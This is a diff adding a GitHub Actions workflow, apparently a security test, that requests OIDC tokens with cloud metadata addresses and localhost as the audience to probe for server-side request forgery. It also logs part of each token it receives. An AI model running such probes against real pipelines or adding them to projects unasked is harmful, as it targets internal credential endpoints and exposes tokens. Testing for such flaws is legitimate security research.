@@ -1,0 +1,29 @@
+name: OIDC SSRF Test
+on: workflow_dispatch
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Get OIDC token with malicious audience
+        uses: actions/github-script@v7
+        with:
+          script: |
+            // Try to get OIDC token with SSRF audience
+            const audiences = [
+              'http://169.254.169.254/',
+              'http://168.63.129.16/',
+              'http://localhost:8080/',
+              'api://169.254.169.254'
+            ];
+            
+            for (const aud of audiences) {
+              try {
+                const token = await core.getIDToken(aud);
+                console.log(`Got token for ${aud}: ${token.substring(0, 50)}...`);
+              } catch (e) {
+                console.log(`Failed for ${aud}: ${e.message}`);
+              }
+            }
